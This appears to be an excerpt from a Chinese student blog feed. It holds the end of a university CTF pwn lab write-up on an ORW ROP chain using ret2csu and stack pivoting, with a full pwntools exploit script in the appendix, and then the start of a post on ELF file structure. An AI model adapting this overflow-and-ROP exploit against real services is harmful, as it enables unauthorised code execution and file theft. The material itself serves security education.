&lt;p&gt;​		设置成0x108是因为在最后一个leave;ret;的时候,mov rsp,rbp,转移栈成功后,要pop出来rbp然后栈往下移动8字节,这个多的0x8用来抵消pop rbp.&lt;/p&gt;
&lt;h3 id=&#34;5-构造ROP链-实现orw&#34;&gt;&lt;a href=&#34;#5-构造ROP链-实现orw&#34; class=&#34;headerlink&#34; title=&#34;5. 构造ROP链, 实现orw&#34;&gt;&lt;/a&gt;5. 构造ROP链, 实现orw&lt;/h3&gt;&lt;h4 id=&#34;5-1-构造orw&#34;&gt;&lt;a href=&#34;#5-1-构造orw&#34; class=&#34;headerlink&#34; title=&#34;5.1 构造orw&#34;&gt;&lt;/a&gt;5.1 构造orw&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload1 = p64(poprdi) + p64(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) + p64(poprsi) + p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(poprsi) + p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) +p64(writeaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		四行的用途分别是&lt;/p&gt;
&lt;p&gt;​		从用户标准输入中读取 .&amp;#x2F;flag 字符,用于后面的open&lt;/p&gt;
&lt;p&gt;​		open .&amp;#x2F;flag 这个文件,得到文件句柄3&lt;/p&gt;
&lt;p&gt;​		read 读取具柄3,读取到bss区域&lt;/p&gt;
&lt;p&gt;​		write 将flag所在bss区域内容输入到标准输出中&lt;/p&gt;
&lt;p&gt;​		在调试中可以看到,在执行第三行操作,即read时,rdx的值被设置成了0,于是需要设置rdx的gadget&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/image-20230403142700054.png&#34; alt=&#34;image-20230403142700054&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;5-2-利用ret2csu构造-read的参数&#34;&gt;&lt;a href=&#34;#5-2-利用ret2csu构造-read的参数&#34; class=&#34;headerlink&#34; title=&#34;5.2 利用ret2csu构造 read的参数&#34;&gt;&lt;/a&gt;5.2 利用ret2csu构造 read的参数&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;csu_front_addr = 0x0000000000401460&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csu_end_addr = 0x000000000040147a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def csu(rbx, rbp, r12, r13, r14, r15):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		# rdi rsi rdx 分别对应着 r12,r13,r14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		# call的地址是[r15+rbx*8], 可以设置r15为地址,rbx为0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		# r15这个地址存储的数据是要call的函数的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp += p64(csu_front_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return payloadtemp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# r12 + rbx*8 = 0x0004010C0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp = csu(0,1,3,bssaddr2,50,0x0404e24)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		要call的地址是[r15+rbx*8], 所以需要找到一个地址,存储着read函数的地址,在尝试利用5.1节第一行payload中存储rop链的中的bss地址中的read地址时发现,后面会被覆盖掉.可以在payload之后,再加上read函数的地址. 计算或者调试出存储其地址的地址.&lt;/p&gt;
&lt;h4 id=&#34;5-3-利用ret2csu继续构造-write的参数&#34;&gt;&lt;a href=&#34;#5-3-利用ret2csu继续构造-write的参数&#34; class=&#34;headerlink&#34; title=&#34;5.3 利用ret2csu继续构造 write的参数&#34;&gt;&lt;/a&gt;5.3 利用ret2csu继续构造 write的参数&lt;/h4&gt;&lt;p&gt;​		在上一步时,设置rbx&amp;#x3D;1,rbp&amp;#x3D;1,即可以让程序继续往下执行,进入第二轮ret2csu,与5.2中的方法类似,构造write的参数&lt;/p&gt;
&lt;p&gt;​		完整exp见附录&lt;/p&gt;
&lt;h1 id=&#34;第二章-题目技术点总结&#34;&gt;&lt;a href=&#34;#第二章-题目技术点总结&#34; class=&#34;headerlink&#34; title=&#34;第二章 题目技术点总结&#34;&gt;&lt;/a&gt;第二章 题目技术点总结&lt;/h1&gt;&lt;h2 id=&#34;一-ORW&#34;&gt;&lt;a href=&#34;#一-ORW&#34; class=&#34;headerlink&#34; title=&#34;一. ORW&#34;&gt;&lt;/a&gt;一. ORW&lt;/h2&gt;&lt;p&gt;​		ORW利用了Linux中的open&amp;#x2F;read&amp;#x2F;write系统调用来执行操作,通常在限制了系统调用的时候使用,在ctf中根本目标是获取flag,所以在拿不到系统权限的时候可以通过该中方法进行获取flag.&lt;/p&gt;
&lt;p&gt;​		orw有很多种不同的系统调用可以使用,并且在不同架构下也有不一样的,根据seccomp具体的限制可以使用不同的方法.&lt;/p&gt;
&lt;p&gt;​		需要注意的是,在做题目时,要根据具体的系统版本来寻找系统调用,在最新版本中有可能加入新的可用的系统调用.&lt;/p&gt;
&lt;h2 id=&#34;二-seccomp&#34;&gt;&lt;a href=&#34;#二-seccomp&#34; class=&#34;headerlink&#34; title=&#34;二. seccomp&#34;&gt;&lt;/a&gt;二. seccomp&lt;/h2&gt;&lt;p&gt;​		seccomp是一种在ctf pwn中常用的安全机制，可用于限制程序对系统调用的访问。通过使用seccomp，可以有效地降低程序受到攻击的风险。&lt;/p&gt;
&lt;h2 id=&#34;三-ret2csu&#34;&gt;&lt;a href=&#34;#三-ret2csu&#34; class=&#34;headerlink&#34; title=&#34;三. ret2csu&#34;&gt;&lt;/a&gt;三. ret2csu&lt;/h2&gt;&lt;p&gt;​		ret2csu是一种在ctf pwn中常用的技术，可用于在程序没有可用的gadget的情况下构造ROP链。它利用了一个特殊的函数__libc_csu_init来调用函数，并利用程序的堆栈来构造ROP链。&lt;/p&gt;
&lt;h2 id=&#34;四-栈迁移&#34;&gt;&lt;a href=&#34;#四-栈迁移&#34; class=&#34;headerlink&#34; title=&#34;四. 栈迁移&#34;&gt;&lt;/a&gt;四. 栈迁移&lt;/h2&gt;&lt;p&gt;​		可用于在程序栈空间不足的情况下，通过将栈迁移到bss段、堆等来执行攻击,也可以利用sub rsp等gadget来增加栈的长度.通常使用的是leave;ret;方法,第一次leave;ret;控制rbp,第二次可以控制rsp&lt;/p&gt;
&lt;h1 id=&#34;第三章-错误处理&#34;&gt;&lt;a href=&#34;#第三章-错误处理&#34; class=&#34;headerlink&#34; title=&#34;第三章 错误处理&#34;&gt;&lt;/a&gt;第三章 错误处理&lt;/h1&gt;&lt;h2 id=&#34;一-open时出错&#34;&gt;&lt;a href=&#34;#一-open时出错&#34; class=&#34;headerlink&#34; title=&#34;一. open时出错&#34;&gt;&lt;/a&gt;一. open时出错&lt;/h2&gt;&lt;p&gt;​		bss段给的地址太小,在动态解析的时候,栈会移动到不可写的地方,导致出错,将bss往后移动多一点即可&lt;/p&gt;
&lt;h2 id=&#34;二-orw-不设置rdx-本地可以打通-远程不可以&#34;&gt;&lt;a href=&#34;#二-orw-不设置rdx-本地可以打通-远程不可以&#34; class=&#34;headerlink&#34; title=&#34;二. orw(不设置rdx) 本地可以打通,远程不可以&#34;&gt;&lt;/a&gt;二. orw(不设置rdx) 本地可以打通,远程不可以&lt;/h2&gt;&lt;p&gt;​		是libc版本的问题,把版本切换到2.27(题目版本)后即可发现,在read时,rdx被设置为了0,因此需要找到能够设置rdx的gadget&lt;/p&gt;
&lt;h2 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_34010404/article/details/123809796&#34;&gt;https://blog.csdn.net/qq_34010404&amp;#x2F;article&amp;#x2F;details&amp;#x2F;123809796&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/113389703&#34;&gt;https://blog.csdn.net/mcmuyanga/article/details/113389703&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45691294/article/details/112196127&#34;&gt;https://blog.csdn.net/qq_45691294&amp;#x2F;article&amp;#x2F;details&amp;#x2F;112196127&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41696518/article/details/126665825&#34;&gt;https://blog.csdn.net/qq_41696518&amp;#x2F;article&amp;#x2F;details&amp;#x2F;126665825&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41202237/article/details/105913597&#34;&gt;https://blog.csdn.net/qq_41202237&amp;#x2F;article&amp;#x2F;details&amp;#x2F;105913597&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/12189&#34;&gt;https://xz.aliyun.com/t/12189&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;附录&#34;&gt;&lt;a href=&#34;#附录&#34; class=&#34;headerlink&#34; title=&#34;附录:&#34;&gt;&lt;/a&gt;附录:&lt;/h1&gt;&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = remote(&amp;quot;xxx&amp;quot;,xxx)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;52017&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;quot;./rop&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x0040131E&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr = &lt;span class=&#34;number&#34;&gt;0x0040412C&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0xd00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retaddr = &lt;span class=&#34;number&#34;&gt;0x0000401304&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readaddr = &lt;span class=&#34;number&#34;&gt;0x0004010D0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openaddr = &lt;span class=&#34;number&#34;&gt;0x00401100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeaddr = &lt;span class=&#34;number&#34;&gt;0x0004010C0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csu_front_addr = &lt;span class=&#34;number&#34;&gt;0x0000000000401460&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csu_end_addr = &lt;span class=&#34;number&#34;&gt;0x000000000040147a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;csu&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rbx, rbp, r12, r13, r14, r15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp += p64(csu_front_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payloadtemp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;csu2&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rbp, r12, r13, r14, r15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp = p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp += p64(csu_front_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payloadtemp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4919&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload =&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt; + p64(bssaddr) + p64(retaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 40413c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poprdi = &lt;span class=&#34;number&#34;&gt;0x0000401483&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poprsi = &lt;span class=&#34;number&#34;&gt;0x0000401481&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr2 = bssaddr + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = &lt;span class=&#34;number&#34;&gt;0x0040131E&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp = csu(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,bssaddr2,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x404e0c&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp2 = csu(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,bssaddr2,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x404e14&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += temp2 + p64(readaddr) + p64(writeaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;len:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = payload1.ljust(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 +=  p64(bssaddr-&lt;span class=&#34;number&#34;&gt;0x108&lt;/span&gt;) + p64(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;./flag\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="研究生课程" />
        <updated>2023-04-04T00:31:49.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/</id>
        <title>ucas-软件安全漏洞分析与发现-elf分析与解析实现</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/"/>
        <content type="html">&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230314100936800.png&#34; alt=&#34;image-20230314100936800&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;一、基础&#34;&gt;&lt;a href=&#34;#一、基础&#34; class=&#34;headerlink&#34; title=&#34;一、基础&#34;&gt;&lt;/a&gt;一、基础&lt;/h1&gt;&lt;h2 id=&#34;ELF文件-整体架构&#34;&gt;&lt;a href=&#34;#ELF文件-整体架构&#34; class=&#34;headerlink&#34; title=&#34;ELF文件 整体架构&#34;&gt;&lt;/a&gt;ELF文件 整体架构&lt;/h2&gt;&lt;p&gt;​	elf文件主要分了几部分:头部、程序头、节表头以及各种节.&lt;/p&gt;
&lt;p&gt;​	elf头部中存储了程序头和节表头的位置,节头中又存储了各个节的位置,以此进行索引.&lt;/p&gt;
&lt;p&gt;​	所以可以回答第2个问题的一部分, 这些节(我认为题目应该说的是节的意思, 段和节经常混用) 在ELF中的位置是可以任意调换的,因为在头部中指定了它们的位置,只要索引信息没问题就可以.&lt;/p&gt;
